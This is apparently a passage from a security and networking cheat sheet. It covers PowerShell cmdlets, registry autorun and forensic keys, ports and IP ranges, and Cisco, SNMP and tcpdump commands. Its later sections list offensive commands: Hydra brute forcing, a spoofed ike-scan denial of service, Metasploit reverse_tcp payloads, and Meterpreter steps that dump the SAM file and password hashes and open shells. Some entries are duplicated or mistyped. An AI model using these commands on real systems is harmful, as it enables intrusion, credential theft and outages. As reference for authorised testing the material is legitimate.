    Remove-Item  r	                    # erase/rd/ri/rmdir   Remove an item
    Remove-Item  r	                    # erase/rd/ri/rmdir   Remove an item
    Remove-ItemProperty	                # Remove a property and its value
    Remove-Job	                        # Delete a PowerShell background job
    Remove-Module	                    # Remove a module from the current session
    Remove-PSBreakpoint 	            # Delete breakpoints from the current console
    Remove-PSDrive	                    # Remove a provider/drive from its location
    Remove-PSSession	                # Close PowerShell sessions
    Remove-PSSnapin	                    # Remove PowerShell snap-ins from the console
    Remove-Variable	                    # Remove a variable and its value
    Remove-Windows	                    # Remove roles, role services, and features
    Remove-WmiObject	                # Delete an instance of a WMI class
    Remove-WSManInstance    	        # Delete a management resource instance
    Rename-Item	                        # Change the name of an existing item
    Rename-ItemProperty	                # Rename a property of an item
    Rename-ItemProperty	                # Renames a property at its location
    Reset-Computer	                    # Password Reset the machine account password for the computer
    Resolve-Path	                    # Resolves the wildcards in a path
    Restart-Computer	                # Restart the operating system on a computer
    Restart-Service	                    # Stop and then restart a service
    Restore-Computer	                # Restore the computer to a previous state
    Restore-GPO	                        # Restore one or all GPOs from a GPO backup
    Resume-Service	                    # Resume a suspended service
    Return	                            # Exit the current scope, (function, script, or script block)
    Run/Call	                        # Run a command (call operator)
    Scheduler 	                        # Get/Set scheduled jobs
    Select-Object	                    # Select properties of objects
    Select-Object	                    # Select properties of objects
    Select-String	                    # Search through strings or files for patterns
    Select-XML	                        # Find text in an XML string or document
    Send-MailMessage	                # Send an email message
    Send-MailMessage	                # Send an email message
    Set-Acl	                            # Set permissions
    Set-Alias	                        # Create or change an alias
    Set-AuthenticodeSignature	        # Place a signature in a .ps1 script or other file
    Set-Content	                        # Set content in the item (specific location)
    Set-Date	                        # Set system time on the host system
    Set-ExecutionPolicy	                # Change the execution policy (user preference)
    Set-Item	                        # Change the value of an item
    Set-ItemProperty	                # Set a property at the specified location to a specified value
    Set-Location	                    # Set the current working location
    Set-Location	                    # Set the current working location
    Set-PSBreakpoint	                # Set a breakpoint on a line, command, or variable
    Set-PSdebug	                        # Turn script debugging on or off
    Set-PSSessionConfiguration	        # Change properties of a registered session config
    Set-Service	                        # Change the start mode/properties of a service
    Set-StrictMode	                    # Enforce coding rules in expressions & scripts
    Set-Tracesource	                    # Trace a PowerShell component
    Set-Variable	                    # Set a variable and a value
    Set-WmiInstance	                    # Create or update an instance of an existing WMI class
    Set-WSManInstance	                # Modify the management information related to a resource
    Set-WSManQuickConfig	            # Configure the local computer for remote management
    Show-EventLog	                    # Display an event log
    Sort-Object	                        # Sort objects by property value
    Sort-Object	                        # Sort objects by property value
    Split-Path	                        # Return part of a path
    Start-DscConfiguration	            # Apply Desired State config to nodes
    Start-Job	                        # Start a PowerShell background job
    Start-Process	                    # Start one or more processes
    Start-Service	                    # Start a stopped service
    Start-Sleep	                        # Suspend shell, script, or runspace activity
    Start-Transaction	                # Start a new transaction
    Start-Transcript	                # Start a transcript of a command shell session
    Stop-Computer	                    # Stop (shut down) a computer
    Stop-Job	                        # Stop a PowerShell background job
    Stop-Process	                    # Stop a running process
    Stop-Process	                    # Stop a running process
    Stop-Service	                    # Stop a running service
    Stop-Transcript	                    # Stop the transcription process
    Suspend-Service	                    # Suspend a running service
    Switch	                            # Multiple if statements
    Tee-Object	                        # Send input objects to two places
    Test-ComputerSecureChannel 	        # Test and repair the secure channel to the domain
    Test-Connection	                    # Ping one or more computers
    Test-Path	                        # Return true if the path exists, otherwise return false
    Test-WSMan	                        # Test if a computer is setup to receive remote command
    Trace-Command	                    # Trace an expression or command
    Trap	                            # Handle a terminating error
    Try ... Catch	                    # Handle a terminating error within a scriptblock
    Unblock-File	                    # Unblock files downloaded from the Internet
    Undo-Transaction	                # Roll back a transaction
    Unregister-Event	                # Cancel an event subscription
    Unregister-PSSessionConfiguration	# Configuration  Delete registered PS session configuration
    Update-Formatdata	                # Update and append format data files
    Update-Help	                        # Download and install help files
    Update-List	                        # Add and remove items from a collection
    Update-TypeData	                    # Update extended type configuration
    Update-Typedata	                    # Update the current extended type configuration
    Use-Transaction	                    # Add a command or expression to the transaction
    Wait-Event	                        # Wait until a particular event is raised
    Wait-Job	                        # Wait for a background job
    Wait-Process	                    # Wait for a process to stop
    Where method	                    # Filter objects from a collection
    Where-Object	                    # Filter the objects passed along the command pipeline
    Where-Object	                    # Filter input from the pipeline
    While	                            # Loop while a condition is True
    Write-Debug	                        # Write a debug message to the host display
    Write-Error	                        # Write an object to the error pipeline
    Write-EventLog	                    # Write an event to an event log
    Write-Host  	                    # Display text on screen
    Write-Host	                        # Write customized output to the host/screen
    Write-Output	                    # Write an object to the pipeline
    Write-Progress	                    # Display a progress bar
    Write-Verbose	                    # Write a string to the host's verbose display
    Write-Warning	                    # Write a string in reverse video to the display
    Zipfile	                            # Compress or Extract zip files

[40]:<http://ss64.com/ps/>

Windows registry 
----------------

### Structure of the Windows Registry (hives)[[56]]

    HKEY_CLASSES_ROOT   # Information stored here ensures that the correct program opens when it is executed in Windows Explorer. 
    HKEY_CURRENT_USER   # Contains configuration information for the user who is currently logged into the system, including user's folders, screen colors, and Control Panel settings
    HKEY_LOCAL_MACHINE  # Contains machine hardware-specific information that the operating system runs on
    HKEY_USERS          # Contains configuration information of all user profiles on the system, which concerns application configurations, and visual settings
    HKEY_CURRENT_CONFIG # Stores information about the systems current configuration. Alias for: HKLM\Config\profile
    
### Autorun locations

    HKLM\Software\Microsoft\Windows\CurrentVersion\Runonce
    HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
    HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run
    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    (ProfilePath)\Start Menu\Programs\Startup 
    
### MRU lists

MRU, or 'most recently used' lists contain entries made due to specific actions performed by the user. There are numerous MRU lists located throughout various Registry keys. 
    
    HKCU\Software\Microsoft\Windows\ CurrentVersion\Explorer\RunMRU
    
### UserAssist
The UserAssist key contains two or more subkeys which have long hexadecimal names that appear as globally unique identifiers (GUIDs). Each subkey records values that pertain to specific objects the user has accessed on the system, such as Control Panel applets, shortcut files, programs, etc.
    
    HCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist

These values however, are encoded using a ROT- 13 encryption algorithm, sometimes known as a Caesar cipher. This particular encryption technique is quite easy to decipher, as each character is substituted with the character 13 spaces away from it in the ASCII table.
With the UserAssist key, a forensic examiner can gain a better understanding of what types of files or applications have been accessed on a particular system.

### Wireless netoworks

    HKLM\SOFTWARE\ Microsoft\WZCSVC\Parameters\Interfaces key        # SSIDs
    HKLM\SYSTEM\ControlSet001\ Services\Tcpip\Parameters\Interfaces\ # flynn-net

### LAN computers

    HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComputerDescriptions. # List of devices, including desktop computers, laptops, and printers 
    
### USB Devices
  
    HKLM\SYSTEM\ControlSet00x\Enum\USBSTOR  # Key stores the contents of the product and device ID values of any USB device that has ever been connected to the system
    
### Mounted devices
  
    HKLM\SYSTEM\MountedDevices   # Stores a database of mounted volumes that is used by the NTFS file system
    
### Firefox
Firefox has limited footprints regarding Registry activity. Firefox stores  web history in a history.dat file, which is in ASCII format and plainly visible when opened.

     C:\Documents and Settings\User Profile\Application Data\Mozilla\Firefox\Profiles\x.default\   
   
[56]:<http://www.forensicfocus.com/a-forensic-analysis-of-the-windows-registry>

Common ports
------------
[[6]]

| Port        | Protocol           | Description  |
| ----------- |:------------------:| ------------:|
| 20 | TCP | FTP |
| 21 | TCP | FTP Control |
| 22 | TCP | SSH |
| 23 | TCP | Telnet |
| 25 | TCP | SMTP |
| 53 | UDP, TCP | DNS |
| 67 | UDP | DHCP Server |
| 68 | UDP | DHCP Client |
| 69 | UDP | TFTP |
| 80 | TCP | HTTP |
| 110 |TCP | POP3 |
| 119 | TCP | NNTP |
| 123 | UDP | NTP |
| 137 | UDP | NetBIOS Name Service |
| 138 | UDP | NetBIOS Datagram Service |
| 139 | TCP | NetBIOS Session Service |
| 143 | TCP | IMAP |
| 161 | UDP | SNMP |
| 162 | UDP | SNMP-trap |
| 389 | TCP | LDAP |
| 443 | TCP | HTTPS |
| 445 | TCP | Direct Hosting | 
| 465 | TCP | SMTP |
| 546 | UDP | DHCP Client (ipv6) |
| 547 | UDP | DHCP Server (ipv6) |
| 569 | TCP | MSN |
| 587 | TCP | SMTP | 
| 990 | TCP | FTPS |
| 993 | TCP | IMAP |
| 995 | TCP | POP3 |
| 1080 | TCP | SOCKS proxy | 
| 1194 | TCP | OpenVPN |
| 3306 | TCP, UDP | MySQL databasesystem |
| 3389 | TCP | RDP |
| 3689 | TCP | DAAP |
| 5432 | TCP, UDP | PostgreSQL databasesystem |
| 5800 | TCP | VNC |
| 5900 | TCP | VNC |
| 6346 | TCP, UDP | Gnutella p2p network |
| 8080 | TCP | HTTP |

[6]:<http://packetlife.net/media/library/23/common_ports.pdf>

IPv4 
----

### CLASSFULL IP RANGES [[17]]

    Class A
      0.  0.  0.  0 = 00000000.00000000.00000000.00000000
    127.255.255.255 = 01111111.11111111.11111111.11111111
                      0nnnnnnn.HHHHHHHH.HHHHHHHH.HHHHHHHH
    
    Class B
    128.  0.  0.  0 = 10000000.00000000.00000000.00000000
    191.255.255.255 = 10111111.11111111.11111111.11111111
                      10nnnnnn.nnnnnnnn.HHHHHHHH.HHHHHHHH
    
    Class C
    192.  0.  0.  0 = 11000000.00000000.00000000.00000000
    223.255.255.255 = 11011111.11111111.11111111.11111111
                      110nnnnn.nnnnnnnn.nnnnnnnn.HHHHHHHH
    
    Class D
    224.  0.  0.  0 = 11100000.00000000.00000000.00000000
    239.255.255.255 = 11101111.11111111.11111111.11111111
                      1110XXXX.XXXXXXXX.XXXXXXXX.XXXXXXXX
    
    Class E
    240.  0.  0.  0 = 11110000.00000000.00000000.00000000
    255.255.255.255 = 11111111.11111111.11111111.11111111
                      1111XXXX.XXXXXXXX.XXXXXXXX.XXXXXXXX
    
    - n: indicates a bit used for the network ID
    - H: indicates a bit used for the host ID
    - X: indicates a bit without a specified purpose
  
### Reserved ranges [[18]]

    0.0.0.0/8       # Used for broadcast messages to the current ("this")
    10.0.0.0/8      # Used for local communications within a private network
    100.64.0.0/10   # Used for communications between a service provider and its subscribers when using a carrier-grade NAT
    127.0.0.0/8     # Used for loopback addresses to the local host
    169.254.0.0/16  # Used for link-local addresses between two hosts on a single link when no IP address is otherwise specified, such as would have normally been retrieved from a DHCP server
    172.16.0.0/12   # Used for local communications within a private network
    192.0.0.0/24    # Used for the IANA IPv4 Special Purpose Address Registry
    192.0.2.0/24    # Assigned as "TEST-NET" for use in documentation and examples. It should not be used publicly
    192.88.99.0/24  # Used by 6to4 anycast relays
    192.168.0.0/16  # Used for local communications within a private network
    198.18.0.0/15   # Used for testing of inter-network communications between two separate subnets
    198.51.100.0/24 # Assigned as "TEST-NET-2" for use in documentation and examples. It should not be used publicly
    203.0.113.0/24  # Assigned as "TEST-NET-3" for use in documentation and examples. It should not be used publicly
    224.0.0.0/4     # Reserved for multicast
    240.0.0.0/4     # Reserved for future use
    255.255.255.255/32  # Reserved for the "limited broadcast" destination address
    
### Subnetting [[19]]

![class_a_subnets.jpg](https://www.dropbox.com/s/i7k6anrqrew7q8h/class_a_subnets.jpg?dl=0&raw=1)

### Calculating subnet range [[20]]

    Address:   192.168.0.1           11000000.10101000.00000000 .00000001
    Netmask:   255.255.255.0 = 24    11111111.11111111.11111111 .00000000
    Wildcard:  0.0.0.255             00000000.00000000.00000000 .11111111
    =>
    Network:   192.168.0.0/24        11000000.10101000.00000000 .00000000       (Class C)
    Broadcast: 192.168.0.255         11000000.10101000.00000000 .11111111
    HostMin:   192.168.0.1           11000000.10101000.00000000 .00000001
    HostMax:   192.168.0.254         11000000.10101000.00000000 .11111110
    Hosts/Net: 254                   (Private Internet)
    
[17]:<https://en.wikipedia.org/wiki/Classful_network>
[18]:<https://en.wikipedia.org/wiki/Reserved_IP_addresses>
[19]:<https://www.tutorialspoint.com/ipv4/ipv4_subnetting.htm>
[20]:<http://jodies.de/ipcalc?host=192.168.0.1&mask1=24&mask2=>

IPv6
----

### Broadcast addresses [[21]]

    ff02:: 	# Link Local: spans the same topological region as the corresponding unicast scope, i.e. all nodes on the same LAN
    ff05:: 	# Site local: is intended to span a single site
    ff08:: 	# Organization scope: Intended to span multiple sizes within the same organization
    ff0e:: 	# Global scope, assigned by IANA
    ff01:: 	# Interface local: Spans only a single interface on a node and is useful only for loopback transmission of multicast

### Interface adresses [[22]]

    fe80::          # link-local
    2001::          # routable
    ::a.b.c.d       # IPv4 compatible IPv6
    ::ffff:a.b.c.d  # IPv4 mapped IPv6
    
### THC Ipv6 Toolkit [[23]]

    rsmurf6     # Smurfs the local network of the victim



[21]:<http://ipv6friday.org/blog/2011/12/ipv6-multicast/>
[22]:<https://tools.ietf.org/html/rfc4291#appendix-A>
[23]:<http://tools.kali.org/information-gathering/thc-ipv6>

Cisco commands
--------------

### Exec commands [[4]]

    <1-99>           # Session number to resume
    connect          # Open a terminal connection
    disconnect       # Disconnect an existing telnet session
    enable           # Turn on privileged commands
    exit             # Exit from Exec mode
    help             # Description of the interactive help system
    lat              # Open a lat connection
    lock             # Lock the terminal
    login            # Log in as a particular user
    logout           # Exit from Exec mode and log out
    menu             # Start a menu-based user interface
    mbranch          # Trace multicast route for branch of tree
    mrbranch         # Trace reverse multicast route to branch of tree
    mtrace           # Trace multicast route to group
    name-connection  # Name an existing telnet connection
    pad              # Open a X.29 PAD connection
    ping             # Send echo messages
    resume           # Resume an active telnet connection
    show             # Show running system information
    systat           # Display information about terminal lines
    telnet           # Open a telnet connection
    terminal         # Set terminal line parameters
    tn3270           # Open a tn3270 connection
    trace            # Trace route to destination
    where            # List active telnet connections
    x3               # Set X.3 parameters on PAD
    
### Common commands [[5]]

    ?                                                   # Help
    show running-configuration                          # Shows the router, switch, or firewall's current configuration
    copy running-configuration startup-configuration    # Save the configuration that is currently being modified (in RAM), also known as the running-configuration, to the nonvolatile RAM (NVRAM)   
    show interface                                      # Displays the status of the router's interfaces
    show ip interface                                   # Provides information about the configuration and status of the IP protocol and its services, on all interfaces.
    config terminal, enable, interface, and router      # Change modes
    no shutdown                                         # Enables an interface (brings it up)
    show ip route                                       # Show the router's routing table
    show version                                        # Gives you the router's configuration register
    debug                                               # It provides detailed debugging output on a certain application, protocol, or service
    
[4]: <http://www.cisco.com/c/en/us/td/docs/ios/12_2/configfun/configuration/guide/ffun_c/fcf001.html>
[5]:<http://www.techrepublic.com/blog/data-center/10-commands-you-should-master-when-working-with-the-cisco-ios-104071/>

SNMP
----

### Concept [[43]]

![snmp.png](https://www.dropbox.com/s/srwfkxgbqyep6yo/snmp.png?dl=0&raw=1)

### Command Examples [[44]]
This command returns an administratively assigned name for this managed node.

    % snmpget -mALL -v1 -cpublic snmp_agent_Ip_address sysName.0
The snmpwalk command performs a sequence of chained GETNEXT requests automatically. It is a work saving command.

    % snmpwalk -mALL -v1 -cpublic snmp_agent_Ip_address system
    
The snmpbulkwalk command uses the GETBULK SNMP protocol feature to query for an entire tree of information about a network entity

    % snmpbulkwalk -mALL -v2c -cprivate snmp_agent_Ip_address entPhysicalTable>time7

    
    
[43]: <http://www.cert.hr/sites/default/files/NCERT-PUBDOC-2010-09-313.pdf>
[44]: <https://docs.oracle.com/cd/E19201-01/820-6413-13/SNMP_commands_reference_appendix.html>

Packet Capturing 
----------------
[[38]]

    tcpdump -i eth0                     # Capture Packets From Specific Interface
    tcpdump -c 5 -i eth0                # Capture Only N Number of Packets
    tcpdump -A -i eth0                  # Print Captured Packets in ASCII
    tcpdump -D                          # Display Available Interfaces  
    tcpdump -XX -i eth0                 # Display Captured Packets in HEX and ASCII
    tcpdump -w 0001.pcap -i eth0        # Capture and Save Packets in a File
    tcpdump -r 0001.pcap                # Read Captured Packets File
    tcpdump -n -i eth0                  # Capture IP address Packets
    tcpdump -i eth0 tcp                 # Capture only TCP Packets
    tcpdump -i eth0 port 22             # Capture Packet from Specific Port
    tcpdump -i eth0 src 192.168.0.2     # Capture Packets from source IP
    tcpdump -i eth0 dst 50.116.66.139   # Capture Packets from destination IP
    
[38]: <http://www.tecmint.com/12-tcpdump-commands-a-network-sniffer-tool/>

DNS
---

### dnsrecon Usage Example[[7]]

Scan a domain (-d example.com), use a dictionary to brute force hostnames (-D /usr/share/wordlists/dnsmap.txt), do a standard scan (-t std), and save the output to a file (–xml dnsrecon.xml)

    nsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml
    
### Ping scan grepable output [[8]]

    # nmap -sn -oG - -iR 100
    # Nmap 5.35DC18 scan initiated [time] as: nmap -sn -oG - -iR 5
    Host: 93.182.218.153 () Status: Up
    Host: 154.223.142.85 () Status: Down
    Host: 120.128.8.97 ()   Status: Down
    Host: 47.159.134.149 () Status: Down
    Host: 24.172.4.19 ()    Status: Down
    # Nmap done at [time] -- 5 IP addresses (1 host up) scanned in 4.25 seconds

[7]: <http://tools.kali.org/information-gathering/dnsrecon>
[8]: <https://nmap.org/book/output-formats-grepable-output.html>

VPN 
---

### Write PSK to a file[[50]]

    ike-scan -M -A vpn ip -P file
        
### DoS VPN SERVER

    ike-scan -A -t 1 --sourceip= spoof ip dst ip

[50]: <https://github.com/royhills/ike-scan>

Brute Forcing Services 
----------------------

### Hydra FTP Brute Force[[2]]

	hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V

### Hydra POP3 Brute Force

	hydra -l USERNAME -P /usr/sha/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V
     
### Hydra SMTP Brute Force

	hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V
	
[2]: <https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#brute-forcing-services>

Exploit Research 
----------------
[[9]]

	searchsploit windows 2003 | grep -i local                                # Search exploit-db for exploit, in this example windows 2003 + local esc
	site:exploit-db.com exploit kernel <= 3                                  # Use google to search exploit-db.com for exploits
	grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*   # Search metasploit modules using grep - msf search 
		
[9]: <https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#exploit-research>

Metasploit 
----------

### Meterpreter Payloads[[36]]

    set payload windows/meterpreter/reverse_tcp     # Windows reverse tcp payload
    set payload windows/vncinject/reverse_tcp       # Meterpreter Windows VNC Payload
    set ViewOnly false
    set payload linux/meterpreter/reverse_tcp       # Meterpreter Linux Reverse Payload
    
### Meterpreter Cheat Sheet

    upload file c:\\windows                  # Meterpreter upload file to Windows target
    download c:\\windows\\repair\\sam /tmp   # Meterpreter download file from Windows target
    download c:\\windows\\repair\\sam /tmp   # Meterpreter download file from Windows target
    execute -f c:\\windows\temp\exploit.exe  # Meterpreter run .exe on target - handy for executing uploaded exploits
    execute -f cmd -c                        # Creates new channel with cmd shell
    ps                                       # Meterpreter show processes
    shell                                    # Meterpreter get shell on the target
    getsystem                                # Meterpreter attempts priviledge escalation on the target
    hashdump                                 # Meterpreter attempts to dump the hashes on the target
    portfwd add –l 3389 –p 3389 –r target    # Meterpreter create port forward to target machine
    portfwd delete –l 3389 –p 3389 –r target # Meterpreter delete port forward

### Auxilary Metasploit Modules

    use auxiliary/scanner/http/dir_scanner      # Metasploit HTTP directory scanner
    use auxiliary/scanner/http/jboss_vulnscan   # Metasploit JBOSS vulnerability scanner
    use auxiliary/scanner/mssql/mssql_login     # Metasploit MSSQL Credential Scanner
    use auxiliary/scanner/mysql/mysql_version   # Metasploit MSSQL Version Scanner
    use auxiliary/scanner/oracle/oracle_login   # Metasploit Oracle Login Module

### Metasploit Powershell Modules

    use exploit/multi/script/web_delivery          # Metasploit powershell payload delivery module
    post/windows/manage/powershell/exec_powershell # Metasploit upload and run powershell script through a session
    use exploit/multi/http/jboss_maindeployer      # Metasploit JBOSS deploy
    use exploit/windows/mssql/mssql_payload        # Metasploit MSSQL payload

[36]: <https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#metasploit>

Password Cracking
-----------------

## John The Ripper - JTR[[39]]

###JTR password cracking

	john --wordlist=/usr/share/wordlists/rockyou.txt hashes	
	
### JTR forced descrypt cracking with wordlist

	john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
	

### JTR forced descrypt cracking with wordlist

	john --format=descrypt hash --show
	
[39]: <https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#john-the-ripper---jtr>
